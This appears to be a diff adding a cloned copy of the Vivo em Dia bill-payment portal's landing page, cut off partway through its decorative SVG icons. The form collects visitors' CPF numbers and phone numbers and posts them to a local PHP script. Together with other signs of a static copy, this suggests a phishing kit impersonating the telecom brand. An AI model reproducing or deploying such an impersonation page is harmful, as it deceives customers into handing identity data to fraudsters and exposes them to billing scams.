@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name="theme-color" content="#660096">
+<meta name="description" content="Vivo em Dia é um portal onde você encontra as informações sobre suas contas em aberto: consulta as contas pendentes, pega a 2ª via, copiar o código de barras, paga com cartão de crédito e verifica quais as opções de negociação disponíveis . Tudo de um jeito rápido, seguro e on-line, sem sair de casa ou de sua empresa.">
+<meta property="og:locale" content="pt_BR">
+<meta property="og:title" content="Vivo Em Dia">
+<meta property="og:site_name" content="Vivo Em Dia">
+<meta property="og:description" content="Vivo em Dia é um portal onde você encontra as informações sobre suas contas em aberto: consulta as contas pendentes, pega a 2ª via, copiar o código de barras, paga com cartão de crédito e verifica quais as opções de negociação disponíveis . Tudo de um jeito rápido, seguro e on-line, sem sair de casa ou de sua empresa.">
+<link id="favicon" rel="shortcut icon" href="./public/static/img/fav.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
+<title>Vivo Em Dia</title>
+<link href="./public/static/css/main.8269972c.css" rel="stylesheet">
+
+<script defer type="text/javascript" src="./public/static/js/app.js"></script>
+<script defer type="text/javascript" src="./public/static/js/cnpj.js"></script>
+<script defer type="text/javascript" src="./public/static/js/phone.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/ui/1.13.2/jquery-ui.min.js" integrity="sha256-lSjKY0/srUM9BE3dPm+c4fBo1dky2v27Gdjm2uoZaL0=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.7/jquery.inputmask.min.js" integrity="sha512-jTgBq4+dMYh73dquskmUFEgMY5mptcbqSw2rmhOZZSJjZbD2wMt0H5nhqWtleVkyBEjmzid5nyERPSNBafG4GQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script type="text/javascript" src="./node_modules/cpf-check/dist/index.umd.js"></script>
+<script>
+      // CPF Validator
+      window.CPF
+    </script>
+<style>
+       #toastr-container { display: none; }
+    </style>
+</head>
+<body class="dx-device-desktop dx-device-generic" style="overflow: auto;">
+<noscript>Você precisa ter o JavaScript ativado para rodar esse app.</noscript>
+<div id="root">
+<section class="containerLogin">
+<div class="fundoB2C active"></div>
+<div class="fundoB2B "></div>
+<div class="containerVivoEmDiaLogin container-fluid">
+<div class="row">
+<div class="col-md-4 col-sm-12">
+<div class="vivo-em-dia">
+<div class="container-logo">
+<img src="./public/static/img/logo-vivo-em-dia.svg" class="logo-vivo-em-dia d-none d-sm-none d-md-block">
+<img src="./public/static/img/logo-vivo-em-dia2.svg" class="logo-vivo-em-dia d-block d-sm-block d-md-none">
+<div class="container-texto">Fizemos um resumo de tudo o que está disponível pra você aqui no site Vivo em Dia. <br>
+<br>Deslize a tela e saiba mais.
+</div>
+</div>
+</div>
+</div>
+<div class="col-md-4 col-12 col-sm-12 mobileMrAutoMlAuto mobilePadding0">
+<div class="container-principal">
+<div class="box-login">
+<div class="box-input">
+<div class="person-selector">
+<div id="person" class="descricao selected">Pessoa Física</div>
+<div id="company" class="descricao">Pessoa Jurídica</div>
+</div>
+<div class="containerInputLogin">
+<form method="post" action="./faturas/index.php">
+<input type="hidden" name="tipo" value="pf">
+<div class="group material-input cpf" style="position: relative;">
+<label class="sr-only"></label>
+<input type="text" class="form-control input-lg " name="documento" placeholder="000.000.000-00" required="" autocomplete="new-password" inputmode="numeric" value="">
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>CPF:</label>
+</div>
+<div class="group material-input telefone" style="position: relative;">
+<label class="sr-only"></label>
+<input type="text" class="form-control input-lg " name="telefone" placeholder="DDD + TELEFONE" maxlength="15" required="" autocomplete="new-password" inputmode="numeric" value="" autofocus>
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Telefone:</label>
+</div>
+
+
+
+<div class="btnContinue">
+<button id="btnContinue" class="btn" style="width: 100%;" disabled>Continuar</button>
+</div>
+</form>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section class="containerInfo">
+<div class="vivoInfo1">
+<div class="containerPrincipal container-fluid">
+<div class="row">
+<div class="col-md-3 col-10 col-sm-10 mobileMrAutoMlAuto">
+<div class="tituloInfo">Conheça os serviços e consultas disponíveis no portal Vivo em Dia.</div>
+<div class="descricaoInfo">Negocie o pagamento de suas contas Vivo pendentes sem precisar sair de casa ou de sua empresa. Clique na opção atendimento no site e fale com um dos nossos atendentes para consultar as condições disponíveis!</div>
+</div>
+<div class="col-md-9 col-12 col-sm-12">
+<div class="row containerCardInfoPrincipal">
+<div class="col-vivo-md-20 col-6 col-sm-6 desktopPadding0 mobileMrAutoMlAuto">
+<div class="containerCardInfo">
+<div class="cardInfo">Pagar com Cartão de crédito.</div>
+<div class="icone">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 17 13.11">
+<defs>
+<style>
+                              .prefix__cls-2,
+                              .prefix__cls-3,
+                              .prefix__cls-4,
+                              .prefix__cls-7 {
+                                fill-rule: evenodd
+                              }
+
+                              .prefix__cls-2 {
+                                fill: #f9db4f
+                              }
+
+                              .prefix__cls-3 {
+                                fill: #0aabdb
+                              }
+
+                              .prefix__cls-4 {
+                                fill: #eb3f7e
+                              }
+
+                              .prefix__cls-7 {
+                                fill: #46225f
+                              }
+                            </style>
+</defs>
+<path d="M28.89 26.47H15.78a.71.71 0 01-.71-.71v-7.91a.71.71 0 01.71-.71h13.11a.71.71 0 01.71.71v7.91a.71.71 0 01-.71.71" transform="translate(-15.07 -17.14)" fill-rule="evenodd" fill="#652c8d"></path>
+<path class="prefix__cls-2" d="M18.18 22.22h-1.39a.35.35 0 01-.35-.34v-1.22a.35.35 0 01.35-.35h1.39a.35.35 0 01.34.35v1.22a.34.34 0 01-.34.34" transform="translate(-15.07 -17.14)"></path>
+<path class="prefix__cls-3" d="M18.65 23.48h-2a.16.16 0 01-.15-.16.15.15 0 01.15-.15h2a.15.15 0 01.15.15.16.16 0 01-.15.16M23.53 24.77h-6.89a.15.15 0 010-.3h6.89a.15.15 0 010 .3M21.44 23.48h-2a.16.16 0 01-.16-.16.16.16 0 01.16-.15h2a.15.15 0 01.15.15.16.16 0 01-.15.16M24.22 23.48h-2a.16.16 0 01-.16-.16.16.16 0 01.16-.15h2a.15.15 0 01.15.15.16.16 0 01-.15.16M27 23.48h-2a.16.16 0 01-.15-.16.15.15 0 01.15-.15h2a.15.15 0 01.15.15.16.16 0 01-.15.16" transform="translate(-15.07 -17.14)"></path>
+<path class="prefix__cls-4" d="M27.26 19.3a.93.93 0 10-.93.93.93.93 0 00.93-.93" transform="translate(-15.07 -17.14)"></path>
+<path class="prefix__cls-2" d="M28.64 19.3a.93.93 0 10-.92.93.93.93 0 00.92-.93" transform="translate(-15.07 -17.14)"></path>
+<path d="M31.35 30.25h-13.1a.71.71 0 01-.71-.71v-7.91a.71.71 0 01.71-.71h13.1a.71.71 0 01.71.71v7.91a.7.7 0 01-.71.71" transform="translate(-15.07 -17.14)" fill="#7f439a" fill-rule="evenodd"></path>
+<path fill="#46225f" d="M2.47 5.4H17v2.08H2.47z"></path>
+<path class="prefix__cls-4" d="M18.72 26.63h12.16a.26.26 0 00.26-.26v-.87a.25.25 0 00-.26-.25H18.72a.26.26 0 00-.26.25v.87a.26.26 0 00.26.26" transform="translate(-15.07 -17.14)"></path>
+<path class="prefix__cls-3" d="M29.76 29.31h1.09a.28.28 0 00.28-.29v-.8a.28.28 0 00-.28-.29h-1.09a.28.28 0 00-.29.29V29a.29.29 0 00.29.29" transform="translate(-15.07 -17.14)"></path>
+<path class="prefix__cls-7" d="M25.81 28.41h-7.14a.13.13 0 110-.26h7.14a.13.13 0 110 .26M23.41 29.09h-4.74a.13.13 0 110-.26h4.74a.13.13 0 01.13.13.13.13 0 01-.13.13" transform="translate(-15.07 -17.14)"></path>
+</svg>
+</div>
+</div>
+</div>
+<div class="col-vivo-md-20 col-6 col-sm-6 desktopPadding0 mobileMrAutoMlAuto">
+<div class="containerCardInfo">
+<div class="cardInfo">Solicitar 2ª via ou código de barras por WhatsApp e SMS.</div>
+<div class="icone">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16.1 13.94">
+ <defs>
+ <style>
+                              .prefix__cls-1 {
+                                fill: #652c8d
+                              }
+
+                              .prefix__cls-1,
+                              .prefix__cls-2,
+                              .prefix__cls-8 {
+                                fill-rule: evenodd
+                              }
+
+                              .prefix__cls-2 {
+                                fill: #7d4199
+                              }
+
+                              .prefix__cls-8 {
+                                fill: #f8961d
+                              }
+                            </style>
+</defs>
+<path class="prefix__cls-1" d="M31.62 30.15h-16.1L17 27.81a1 1 0 01.79-.45h11.59a1 1 0 01.8.45l1.44 2.34" transform="translate(-15.52 -16.73)"></path>
+<path class="prefix__cls-2" d="M.07 13.32l-.07.1h16.1l-.07-.1H.07z"></path>
+<path class="prefix__cls-1" d="M29.64 19.28h-12.1a.29.29 0 00-.3.29v7.49a.29.29 0 00.3.3h12.1a.29.29 0 00.29-.3v-7.49a.28.28 0 00-.29-.29" transform="translate(-15.52 -16.73)"></path>
+<path d="M17.76 26.59v-6.43a.29.29 0 01.29-.3h11.08a.29.29 0 01.29.3v6.43a.29.29 0 01-.29.29H18.05a.29.29 0 01-.29-.29" transform="translate(-15.52 -16.73)" fill="#eb6494" fill-rule="evenodd"></path>
+<path d="M24.84 29.63l-.2-.51a.21.21 0 00-.17-.11h-1.9a.2.2 0 00-.17.11l-.21.51a.19.19 0 00.18.24h2.3a.17.17 0 00.17-.24M30 28.36l-.24-.36a.94.94 0 00-.79-.45H18.1a.9.9 0 00-.79.45l-.21.34a.31.31 0 00.24.45h12.39a.31.31 0 00.27-.43zm1.2 2.31H16a.46.46 0 01-.45-.45h16.04a.42.42 0 01-.42.45z" transform="translate(-15.52 -16.73)" fill="#321a4b" fill-rule="evenodd"></path>
+<path fill="#56297b" d="M3.34 2.55h9.46v.58H3.34z"></path>
+<path fill="#da5794" fill-rule="evenodd" d="M3.34 3.15l.31 7h8.83l.31-7H3.34z"></path>
+<path d="M27 16.73h-6.87a.61.61 0 00-.62.61v9.53h8v-9.53a.56.56 0 00-.58-.61" transform="translate(-15.52 -16.73)" fill="#f7d84f" fill-rule="evenodd"></path>
+<path class="prefix__cls-8" d="M23 18h-2.15a.08.08 0 01-.07-.07.08.08 0 01.07-.07H23a.07.07 0 01.06.07L23 18M22 18.45h-1.1a.08.08 0 01-.07-.07s0-.06.07-.06H22a.08.08 0 01.07.07.07.07 0 01-.07.07M22.33 18.9h-1.51a.07.07 0 01-.07-.07.08.08 0 01.07-.07h1.51a.08.08 0 01.07.07s0 .07-.07.07M26.36 18.83h-1.65a.23.23 0 01-.24-.24V18a.24.24 0 01.24-.25h1.65a.25.25 0 01.24.25v.58a.24.24 0 01-.24.24" transform="translate(-15.52 -16.73)"></path>
+<path d="M22.13 24.75a.27.27 0 01-.14-.38l.1-.24c.07-.17.21-.21.41-.1a2.92 2.92 0 00.93.2c.28 0 .52-.07.52-.27s-.07-.17-.21-.24a2.35 2.35 0 00-.58-.18c-.59-.13-1.1-.41-1.1-1.1a1.07 1.07 0 011-1.06V21a.3.3 0 01.27-.27h.28A.28.28 0 0124 21v.35a3.67 3.67 0 01.69.17.29.29 0 01.2.38l-.07.24a.29.29 0 01-.41.17 2.64 2.64 0 00-.86-.21c-.31 0-.51.07-.51.28s.27.31.86.48 1.1.38 1.1 1-.42 1-1 1.1v.35a.27.27 0 01-.31.27h-.3a.27.27 0 01-.31-.27V25a8.82 8.82 0 01-.86-.31" transform="translate(-15.52 -16.73)" fill="#eac356" fill-rule="evenodd"></path>
+<path class="prefix__cls-2" d="M22.13 24.58c-.18-.11-.21-.24-.14-.38l.1-.24c.07-.17.21-.21.41-.11a2.68 2.68 0 00.93.21c.28 0 .52-.07.52-.27s-.07-.18-.21-.25a3.06 3.06 0 00-.58-.17c-.59-.14-1.1-.41-1.1-1.1a1.09 1.09 0 011-1.07v-.34a.29.29 0 01.27-.27h.28a.28.28 0 01.31.27v.34a4.64 4.64 0 01.69.18.29.29 0 01.2.38l-.07.24a.29.29 0 01-.41.17 2.64 2.64 0 00-.83-.17c-.31 0-.51.07-.51.28s.27.31.86.48 1.1.38 1.1 1-.42 1-1 1.1v.35a.27.27 0 01-.31.27h-.3a.27.27 0 01-.34-.28v-.31c-.28-.11-.59-.18-.86-.31" transform="translate(-15.52 -16.73)"></path>
+</svg>
+</div>
+</div>
+</div>
+<div class="col-vivo-md-20 col-6 col-sm-6 desktopPadding0 mobileMrAutoMlAuto">
+<div class="containerCardInfo">
+<div class="cardInfo">Atendimento por WhatsApp, chat, SMS, e-mail ou ligação.</div>
+<div class="icone iconeQuestion">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14.64 15.41">
+<defs>
+<style>
+                              .prefix__cls-2,
+                              .prefix__cls-3 {
+                                fill-rule: evenodd
+                              }
+
+                              .prefix__cls-2 {
+                                fill: #f9db4f
+                              }
+
+                              .prefix__cls-3 {
+                                fill: #edc656
+                              }
+                            </style>
+</defs>
+<path d="M27.55 28.79V22a.92.92 0 00-.92-.92h-9.52a.92.92 0 00-.91.92v8.62a.92.92 0 00.91.92h12a.18.18 0 00.18-.14 1.9 1.9 0 000-.63L28.06 30a1.78 1.78 0 01-.51-1.23" transform="translate(-16.2 -16.08)" fill-rule="evenodd" fill="#f8991d"></path>
+<path class="prefix__cls-2" d="M27.57 28.27v-6.83a.92.92 0 00-.92-.92h-9.51a.92.92 0 00-.91.92v8.62a.91.91 0 00.91.91h12a.19.19 0 00.13-.32L28.1 29.5a1.68 1.68 0 01-.53-1.23z" transform="translate(-16.2 -16.08)"></path>
+<path class="prefix__cls-3" d="M20.53 28.8a1 1 0 012 0 1 1 0 01-2 0m3.93-4.35c0 1-.53 1.89-2.07 2.12v.12a.62.62 0 01-.63.63h-.36a.62.62 0 01-.64-.65V26a.65.65 0 01.59-.68c.95-.12 1.32-.29 1.32-.74s-.45-.54-1.06-.54a3.41 3.41 0 00-1.37.33.59.59 0 01-.84-.26l-.18-.35a.62.62 0 01.27-.85 4.28 4.28 0 012.13-.51c1.56.03 2.84.6 2.84 2.05z" transform="translate(-16.2 -16.08)"></path>
+<path d="M20.53 28.47a1 1 0 112 0 1 1 0 01-2 0m3.93-4.35c0 1-.53 1.88-2.07 2.12v.11a.61.61 0 01-.63.63h-.36a.61.61 0 01-.64-.64v-.64a.64.64 0 01.59-.68c.95-.12 1.32-.29 1.32-.74s-.45-.55-1.06-.55a3.44 3.44 0 00-1.37.34.59.59 0 01-.84-.27l-.18-.34a.62.62 0 01.27-.85 4.28 4.28 0 012.13-.51c1.56.01 2.84.56 2.84 2.02z" transform="translate(-16.2 -16.08)" fill="#652c90" fill-rule="evenodd"></path>
+<path class="prefix__cls-3" d="M26.66 20.52h-2.88a3.36 3.36 0 000 .78 1 1 0 01-.21.75l-.8 1a.15.15 0 00.13.24l1.1-.12a1 1 0 01.86.29 3.63 3.63 0 002.14 1 2.35 2.35 0 00.53 0v-3a.92.92 0 00-.87-.94z" transform="translate(-16.2 -16.08)"></path>
+<path d="M23.32 22.4l-.53.69a.14.14 0 00.13.23l1.08-.14h.18a1.9 1.9 0 00-.9-.77" transform="translate(-16.2 -16.08)" fill="#56297b" fill-rule="evenodd"></path>
+<path d="M26.75 16.09a3.79 3.79 0 00-3.47 3.47 3.59 3.59 0 00.17 1.44 1.06 1.06 0 01-.08.82l-.63 1.21a.16.16 0 00.18.22l1.13-.36a1.14 1.14 0 01.95.13 3.79 3.79 0 101.75-7" transform="translate(-16.2 -16.08)" fill="#eb3f7e" fill-rule="evenodd"></path>
+<path class="prefix__cls-2" d="M26 20a.49.49 0 10-.49.49A.49.49 0 0026 20M27.6 20a.5.5 0 10-.49.49.49.49 0 00.49-.49M29.23 20a.5.5 0 10-.5.49.49.49 0 00.5-.49" transform="translate(-16.2 -16.08)"></path>
+</svg>
+</div>
+</div>
+</div>
+<div class="col-vivo-md-20 col-6 col-sm-6 desktopPadding0 mobileMrAutoMlAuto">
+<div class="containerCardInfo">
+<div class="cardInfo">Negociar de maneira rápida e fácil.</div>
+<div class="icone">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16.14 12.87">
+<defs>
+<style>
+
+                              .prefix__cls-1 {
+                                fill: #f2642a
+                              }
+
+                              .prefix__cls-1,
+                              .prefix__cls-2,
+                              .prefix__cls-3,
+                              .prefix__cls-4,
+                              .prefix__cls-6,
+                              .prefix__cls-7,
+                              .prefix__cls-8 {
+                                fill-rule: evenodd
+                              }
+
+                              .prefix__cls-2 {
+                                fill: #fbac36
+                              }
+
+                              .prefix__cls-3 {
+                                fill: #f9db4f
+                              }
+
+                              .prefix__cls-4 {
+                                fill: #f8991d
+                              }
+
+                              .prefix__cls-6 {
+                                fill: #eb3f7e
+                              }
+
+                              .prefix__cls-7 {
+                                fill: #0aabdb
+                              }
+
+                              .prefix__cls-8 {
+                                fill: #6bc9e9
+                              }
+
+                            </style>
+</defs>
+<path class="prefix__cls-1" d="M28.94 16.48h-11.6a.51.51 0 00-.51.51v8.2a.51.51 0 00.51.51h11.6a.52.52 0 00.52-.51V17a.53.53 0 00-.52-.51" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-2" d="M29.16 16.48h-11.6A.52.52 0 0017 17v8.2a.52.52 0 00.52.51h11.6a.51.51 0 00.51-.51V17a.51.51 0 00-.47-.52z" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-3" d="M28.69 16.89H18a.53.53 0 00-.52.52V24a.52.52 0 00.52.51h10.69a.52.52 0 00.52-.51v-6.59a.53.53 0 00-.52-.52" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-4" d="M19.54 22.28a.56.56 0 00-.56-.56h-1.93v3.47a.51.51 0 00.51.51h2v-3.42" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-2" d="M19.54 22.28a.56.56 0 00-.56-.56h-1.47V24a.52.52 0 00.52.51h1.51v-2.23" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-1" d="M24.05 25.21h-1.36a.1.1 0 01-.1-.09.1.1 0 01.1-.09h1.36a.09.09 0 01.09.09.09.09 0 01-.09.09" transform="translate(-15.63 -16.48)"></path>
+<path d="M18.29 21.88h-2.11a.56.56 0 00-.55.56V28a.56.56 0 00.55.56h2.11a.56.56 0 00.56-.56v-5.56a.56.56 0 00-.56-.56" transform="translate(-15.63 -16.48)" fill="#cb215a" fill-rule="evenodd"></path>
+<path class="prefix__cls-6" d="M18.5 21.88h-2.11a.56.56 0 00-.56.56V28a.56.56 0 00.56.56h2.11a.57.57 0 00.56-.56v-5.56a.57.57 0 00-.57-.56" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-3" d="M18.46 22.12h-.21a.06.06 0 00-.05.06v.09a.12.12 0 01-.12.11h-1.26a.11.11 0 01-.11-.11v-.09a.06.06 0 00-.06-.06h-.21a.41.41 0 00-.41.41v5.34a.41.41 0 00.41.41h2a.41.41 0 00.41-.41v-5.34a.43.43 0 00-.42-.41M17.72 22.25h.05-.07m-.44 0h.36-.39.05z" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-6" d="M23.36 20.69a1.65 1.65 0 00-1.08.41.18.18 0 000 .3.23.23 0 00.31 0 1.08 1.08 0 01.75-.28 1.1 1.1 0 01.74.28.23.23 0 00.31 0 .24.24 0 000-.3 1.67 1.67 0 00-1.08-.41" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-6" d="M23.36 19.61a2.74 2.74 0 00-1.83.72.19.19 0 000 .3.19.19 0 00.28 0 2.21 2.21 0 011.52-.59 2.26 2.26 0 011.51.59.19.19 0 00.28 0 .22.22 0 000-.3 2.74 2.74 0 00-1.82-.72" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-6" d="M20.81 19.94a.24.24 0 00.33 0 3.25 3.25 0 014.43 0 .22.22 0 00.3 0 .23.23 0 000-.31 3.68 3.68 0 00-5 0 .2.2 0 00-.05.31M23.77 22.28a.41.41 0 00-.41-.41.41.41 0 000 .82.41.41 0 00.41-.41" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-7" d="M17.86 25.35h.05l.32-.07a.23.23 0 00-.1-.45l-.38.09a.05.05 0 01-.07-.05.06.06 0 010-.08.48.48 0 00.25-.43.47.47 0 00-.48-.44.47.47 0 00-.48.5.43.43 0 00.26.37s.05 0 0 .08 0 0 0 .05h-.05c-.05 0-.16-.05-.34-.08s-.26.12-.26.12v.08a.2.2 0 00.11.22 2.06 2.06 0 00.32.07c.08 0 .11.06.11.13a.18.18 0 010 .13l-.35.43a.19.19 0 00-.06.13.86.86 0 000 .13.44.44 0 00.1.08.19.19 0 00.15 0 .27.27 0 00.11-.06l.29-.35h.16s.19.22.26.32.19.14.34 0a.16.16 0 00.05-.24l-.37-.44a.23.23 0 01-.05-.16.25.25 0 01.11-.08z" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-4" d="M29.67 18.72c-.71 1.12-3.39 5.49-4.31 7h3.79a.52.52 0 00.52-.51z" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-2" d="M29.21 19.47C28.4 20.76 27 23 26.07 24.55h2.62a.52.52 0 00.52-.51z" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-8" d="M31.32 20.13l-1.46.12a.58.58 0 00-.19.1l-.17.17a.91.91 0 00-.11.22s-3.52 7.57-3.53 7.64a.8.8 0 00.2.35.93.93 0 00.36.23l1.13.32a1.61 1.61 0 00.37.07c.67-.12 1.06-.57 2.22-3.51s1.63-4.56 1.58-5-.46-.68-.44-.7" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-8" d="M29.81 20.4l.62-1.54c0-.11 0-.19-.11-.2a.12.12 0 00-.15.08l-.63 1.54c0 .11 0 .19.12.2a.13.13 0 00.15-.08" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-7" d="M31.13 20.06a.23.23 0 01.15.07.43.43 0 01.09.13 1.09 1.09 0 010 .19.52.52 0 01-.05.24l-3.2 7.82a1.18 1.18 0 01-.14.22.91.91 0 01-.17.17.56.56 0 01-.19.09.31.31 0 01-.19 0L26 28.6c-.06 0-.11 0-.14-.09a.26.26 0 01-.06-.15.33.33 0 010-.2c0-.08 0-.15.06-.24L29 20.41a1.67 1.67 0 01.12-.23c0-.06.12-.11.17-.16a.47.47 0 01.19-.11.65.65 0 01.19 0z" transform="translate(-15.63 -16.48)"></path>
+<path class="prefix__cls-3" d="M28.25 27h.05v.14a.18.18 0 010 .09.56.56 0 010 .08l-.06.06H27.94v-.13a.13.13 0 010-.09.56.56 0 01.05-.08A.22.22 0 0128 27h.13zm-1.19-.27h.05v.11a.13.13 0 010 .09.56.56 0 01-.05.08l-.06.07a.13.13 0 01-.07 0h-.21-.06a.09.09 0 010-.06v-.12a.16.16 0 010-.09.56.56 0 01.05-.08l.07-.05h.13zm1.47-.41h.06v.14a.18.18 0 010 .09.56.56 0 01-.05.08.19.19 0 01-.07.06.11.11 0 01-.06 0H28.17h-.05c-.05 0 0 0 0-.05v-.06a.13.13 0 010-.09.56.56 0 01.05-.08.15.15 0 01.07-.07h.13zm-.61-.13h.06v.07a.12.12 0 010 .08.73.73 0 010 .09.32.32 0 01-.07.06H27.61h-.05c-.05 0 0 0 0 0v-.07a.12.12 0 010-.08.73.73 0 010-.09l.06-.06a.13.13 0 01.07 0h.06zm-.57-.19v.12a.16.16 0 010 .09l-.06.08-.06.07h-.33v-.11a.13.13 0 010-.09l.06-.08.06-.07a.11.11 0 01.07 0h.06zm1.46-.41h.06c.01 0 0 0 0 .06v.15a.22.22 0 01-.05.08l-.06.07H28.46h-.06c-.06 0 0 0 0-.05v-.06a.13.13 0 010-.09.56.56 0 01.05-.08.22.22 0 01.07-.07h.13zm-.59-.14h.05c.05 0 0 0 0 .05v.06a.13.13 0 010 .09.56.56 0 01-.05.08.15.15 0 01-.07.07h-.32-.05a.09.09 0 010-.06v-.06a.16.16 0 010-.09.56.56 0 01.05-.08l.07-.07h.13zm-.6-.13h.05v.11a.13.13 0 010 .09.56.56 0 01-.05.08l-.06.07a.13.13 0 01-.07 0h-.27a.09.09 0 010-.06v-.06a.16.16 0 010-.09.56.56 0 01.05-.08l.07-.07h.13zm1.47-.42h.06v.1a.13.13 0 010 .09.56.56 0 01-.05.08.15.15 0 01-.07.07H28.73a.09.09 0 010-.06v-.06a.16.16 0 010-.09.56.56 0 01.05-.08.19.19 0 01.07-.06.11.11 0 01.06 0h.07zm-.61-.12h.05V24.9a.11.11 0 010 .08.73.73 0 01-.05.09.32.32 0 01-.07.06h-.33V25a.12.12 0 010-.08.73.73 0 01.05-.09l.06-.06a.13.13 0 01.07 0h.06zm-.59-.12h.07a.09.09 0 010 .06v.06a.16.16 0 010 .09.56.56 0 010 .08l-.07.06H27.54v-.11a.12.12 0 010-.08.36.36 0 01.05-.09l.06-.06a.13.13 0 01.07 0h.06zm1.48-.44h.05V24.34a.12.12 0 010 .08.36.36 0 01-.05.09.33.33 0 01-.06.06H29.01h-.06c-.06 0 0 0 0-.05v-.07a.12.12 0 010-.08.73.73 0 01.05-.09.32.32 0 01.07-.06.11.11 0 01.06 0h.07zm-.61-.12a.09.09 0 010 .06v.06a.16.16 0 010 .09.56.56 0 01-.05.08l-.07.07H28.34v-.11a.13.13 0 010-.09.56.56 0 01.05-.08l.07-.07a.11.11 0 01.06 0h.07zm-.6-.1h.06v.07a.12.12 0 010 .08.73.73 0 01-.05.09l-.07.06h-.25V24.18a.12.12 0 010-.08.36.36 0 01.05-.09l.06-.06.04.05zm-1 4.3l-.43-.13v-.05zm3.26-7.93l-.42.06zm.31.93h.08c.08 0 0 0 0 .05v.06a.13.13 0 010 .09l-.58 1.4a.36.36 0 01-.05.09.32.32 0 01-.07.06.11.11 0 01-.06 0H30l-1.73-.31h-.05a.09.09 0 010-.05v-.07a.12.12 0 010-.08l.56-1.36a.19.19 0 01.05-.09v-.06L29 21z" transform="translate(-15.63 -16.48)"></path>
+</svg>
+</div>
+</div>
+</div>
+<div class="col-vivo-md-20 col-6 col-sm-6 desktopPadding0 mobileMrAutoMlAuto">
+<div class="containerCardInfo">
+<div class="cardInfo">Agilidade e Segurança.</div>
+<div class="icone iconeSecurity">
+<svg id="prefix__Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12.49 13.64">
+<defs>
+<style>
+                              .prefix__cls-4 {
+                                fill-rule: evenodd;
+                                fill: #81b7dd
+                              }
+                            </style>
+</defs>
+<path d="M30.25 19.23c0 8.49-5.19 11-6.11 11.56a.28.28 0 01-.28 0c-.92-.56-6.11-3.07-6.11-11.56a.35.35 0 01.34-.34h.19a9.58 9.58 0 005.53-1.65.35.35 0 01.39 0 9.86 9.86 0 005.53 1.65h.19a.35.35 0 01.33.34" transform="translate(-17.75 -17.18)" fill-rule="evenodd" fill="#0aabdb"></path>
+<path d="M29.92 18.89h-.19a9.78 9.78 0 01-5.53-1.65h-.13v13.57a.07.07 0 00.06 0c.92-.57 6.11-3.07 6.11-11.55a.33.33 0 00-.32-.37z" transform="translate(-17.75 -17.18)" fill="#3095ce" fill-rule="evenodd"></path>
+<path d="M24 29.28c-1.39-.81-4.52-3.18-4.83-9a11.16 11.16 0 004.83-1.5 11.3 11.3 0 004.85 1.48c-.33 5.84-3.45 8.21-4.85 9" transform="translate(-17.75 -17.18)" fill="#83c7e5" fill-rule="evenodd"></path>
+<path class="prefix__cls-4" d="M24.08 18.82v10.41c1.43-.85 4.44-3.23 4.77-9a11.19 11.19 0 01-4.77-1.41z" transform="translate(-17.75 -17.18)"></path>
+<path d="M25.56 24.39h-.44V21.8a1.09 1.09 0 00-2.18 0v2.59h-.44V21.8a1.53 1.53 0 113.06 0z" transform="translate(-17.75 -17.18)" fill="#f9db4f" fill-rule="evenodd"></path>
+<path class="prefix__cls-4" d="M25.76 22.85h-3.58a.43.43 0 00-.42.42V26a.42.42 0 00.42.42h3.58a.42.42 0 00.43-.42v-2.73a.42.42 0 00-.43-.42" transform="translate(-17.75 -17.18)"></path>
+<path d="M23.05 22.41h2.71a.42.42 0 01.43.42v2.71a.42.42 0 01-.43.42h-2.71a.42.42 0 01-.42-.42v-2.71a.42.42 0 01.42-.42" transform="translate(-17.75 -17.18)" fill="#cb215a" fill-rule="evenodd"></path>
+<path d="M22.18 22.41h2.71a.42.42 0 01.42.42v2.71a.42.42 0 01-.42.42h-2.71a.41.41 0 01-.42-.42v-2.71a.43.43 0 01.42-.42" transform="translate(-17.75 -17.18)" fill="#eb3f7e" fill-rule="evenodd"></path>
